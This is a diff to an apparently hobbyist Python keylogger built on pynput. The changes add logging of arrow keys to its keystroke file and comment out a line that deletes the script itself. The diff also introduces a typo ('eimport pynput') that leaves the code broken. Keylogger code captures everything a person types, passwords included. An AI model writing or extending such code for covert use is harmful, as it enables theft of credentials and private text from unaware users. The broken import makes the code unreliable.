@@ -1,4 +1,4 @@
-import pynput
+eimport pynput
 from pynput.keyboard import Key,Listener
 import webbrowser
 import os, atexit
@@ -48,14 +48,17 @@ def write_file(keys):
                 f.write(k)
             elif k.find("esc") > 0:
                 f.write("\n")
-            
-
+            elif k.find("right") > 0:
+                f.write("[right key]")
+            elif k.find("left") > 0:
+                f.write("[left key]")
 
 #for stopping everything
 def on_release(key):
     if key == Key.esc:
         return False
-        os.remove("PyKey.py")#deleting file that didnt work? wat
+        #return True
+        # os.remove("PyKey.py")#deleting file that didnt work? wat
 
 #calling all functions
 with Listener(on_press=on_press, on_release=on_release)as listener:
